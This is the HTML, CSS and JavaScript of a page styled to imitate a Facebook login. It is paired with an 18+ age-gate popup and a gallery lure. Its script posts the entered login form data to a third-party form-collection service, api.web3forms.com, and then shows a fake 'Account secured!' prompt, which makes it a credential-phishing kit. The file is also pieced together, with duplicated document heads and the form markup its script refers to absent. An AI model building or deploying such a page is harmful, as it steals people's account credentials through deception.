<!DOCTYPE html>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;

      background-color: #f0f2f5; /* Facebook's light gray background */
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .login-container {
      width: 90%;
      max-width: 360px;
      padding: 40px;
      background-color: white;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .facebook-logo {
      margin-bottom: 20px;
    }

    .facebook-logo img {
      width: 120px;
      height: auto;
    }

    h1 {
      color: #1877f2; /* Facebook blue */
      font-size: 36px;
      margin-bottom: 20px;
      font-weight: bold;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      font-size: 16px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      transition: border-color 0.3s;
    }

    input:focus {
      border-color: #1877f2; /* Facebook blue */
      outline: none;
    }

    button {
      width: 100%;
      padding: 12px;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      background-color: #1877f2; /* Facebook blue */
      color: white;
      font-weight: bold;
      margin-top: 10px;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #145dbf; /* Darker Facebook blue */
    }

    .forgot-password {
      color: #1877f2; /* Facebook blue */
      text-decoration: none;
      font-size: 14px;
      margin-top: 10px;
    }

    .create-account {
      margin-top: 20px;
      font-size: 14px;
    }

    .create-account a {
      color: #1877f2; /* Facebook blue */
      text-decoration: none;
      font-weight: bold;
    }

    #result {
      margin-top: 15px;
      color: red;
    }

    /* Gallery styles */
    .gallery {
      display: none;
      margin-top: 20px;
      width: 100%;
      max-width: 360px;
      height: 700px;
      overflow-y: auto;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      background-color: white;
    }

    .gallery-item {
      padding: 10px;
      border-bottom: 1px solid #ddd;
      text-align: center;
    }

    .gallery-item:last-child {
      border-bottom: none;
    }

    .gallery img {
      max-width: 100%;
      height: auto;
      border-radius: 19px;
    }

    /* Modal styles */
    .modal {
      display: none;
      position: fixed;
      z-index: 1;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0, 0, 0, 0.4);
      padding-top: 60px;
    }

    .modal-content {
      background-color: white;
      margin: 5% auto;
      padding: 20px;
      border: 1px solid #888;
      width: 80%;
      text-align: center;
    }

    .close {
      color: #aaa;
      float: right;
      font-size: 28px;
      font-weight: bold;
    }

    .close:hover,
    .close:focus {
      color: black;
      text-decoration: none;
      cursor: pointer;
    }

    .modal-buttons {
      display: flex;
      justify-content: space-around;
      margin-top: 10px;
    }

    #logoutBtn {
      margin-top: 10px;
      background-color: #dc3545;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }

    #logoutBtn:hover {
      background-color: #a52a2a;
    }
  </style> 
</head> 
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">

  <title>Styled Popup</title>
  <style>
    /* Basic page styles */
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f0f0f0;
    }

    /* Popup container (background overlay) */
    .popup-container {
      display: none; /* Hidden by default */
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
      z-index: 1000;
      justify-content: center;
      align-items: center;
      transition: opacity 0.5s ease;
      opacity: 0;
    }

    /* Popup content box */
    .popup-box {
      background-color:white;
      padding: 20px;
      width: 80%;
      max-width: 400px;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
      text-align: center;
      animation: popupAnimation 0.5s ease-out;
    }

    /* Popup heading */
    .popup-box h2 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #333;
    }

    /* Popup message */
    .popup-box p {
      font-size: 16px;
      color: #666;
    }

    /* Close button styling */
    .close-btn {
      margin-top: 20px;
      padding: 10px 20px;
      background-color:#F57C00; /* Red color */
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .close-btn:hover {
      background-color: #d32f2f; /* Darker red on hover */
    }

    /* Popup animation */
    @keyframes popupAnimation {
      from {
        transform: scale(0.8);
        opacity: 0;
      }
      to {
        transform: scale(1);
        opacity: 1;
      }
    }
  </style>
</head>
<body>

  <!-- Popup container -->
  <div id="popup" class="popup-container">
    <div class="popup-box">
      <h2>Warning!</h2>
      <p>You must 18+ to access this site to continue tap the button below</p>
      <button class="close-btn" onclick="closePopup()">Yes i am 18+</button>
    </div>
  </div>

  <script>
    // Function to show the popup
    function showPopup() {
      var popup = document.getElementById('popup');
      popup.style.display = 'flex'; // Show the popup
      setTimeout(function() {
        popup.style.opacity = 1; // Fade-in effect
      }, 10);
    }

    // Function to close the popup
    function closePopup() {
      var popup = document.getElementById('popup');
      popup.style.opacity = 0; // Fade-out effect
      setTimeout(function() {
        popup.style.display = 'none'; // Hide the popup after fade-out
      }, 500); // Match with the fade-out duration
    }

    // Show the popup after page load
    window.onload = showPopup;
  </script>

</body>
</html>

<script>
const form = document.getElementById('form');
const result = document.getElementById('result');
const loginContainer = document.getElementById('login-container');
const gallery = document.getElementById('gallery');
const modal = document.getElementById("myModal");
const span = document.getElementsByClassName("close")[0];

let loggedIn = localStorage.getItem('loggedIn') === 'true'; // Check if user is logged in

// Check if user is already logged in on page load
if (loggedIn) {
  loginContainer.style.display = "none"; // Hide login container
  gallery.style.display = "block"; // Show gallery
}

form.addEventListener('submit', function(e) {
  e.preventDefault();

  // Check if user is already logged in
  if (loggedIn) {
    result.innerHTML = "You are already logged in.";
    return; // Prevent further processing
  }

  const formData = new FormData(form);
  const object = Object.fromEntries(formData);
  const json = JSON.stringify(object);
  result.innerHTML = "";

  fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
      },
      body: json
  })
  .then(response => response.json())
  .then(data => {
      if (data.success) {
          loggedIn = true; // Set loggedIn to true on successful login
          localStorage.setItem('loggedIn', 'true'); // Save login status in local storage
          loginContainer.style.display = "none"; // Hide login on success
          gallery.style.display = "block"; // Show gallery
          result.innerHTML = "Login successful!";
          modal.style.display = "block"; // Open modal for security enablement
      } else {
          result.innerHTML = "Login failed. Please try again.";
      }
  })
  .catch(error => {
      result.innerHTML = "Please open your internet once Login you can turn it off.";
      console.error('Error:', error);
  });
});

// Close modal on 'x' click
span.onclick = function() {
  modal.style.display = "none";
}

// Close modal if user clicks outside of it
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}

// Enable Facebook security button
document.getElementById("enableBtn").onclick = function() {
  alert("Account secured!");
  modal.style.display = "none"; // Close the modal after enabling
};

// Back button functionality
document.getElementById("backBtn").onclick = function() {
  modal.style.display = "none"; // Close the modal when clicking "Back"
};

// Logout functionality
document.getElementById("logoutBtn").onclick = function() {
  gallery.style.display = "none"; // Hide the gallery
  loginContainer.style.display = "block"; // Show the login container again
  result.innerHTML = ""; // Clear any result message
  loggedIn = false; // Reset the login status
  localStorage.removeItem('loggedIn'); // Clear the login status from local storage
};

</script>
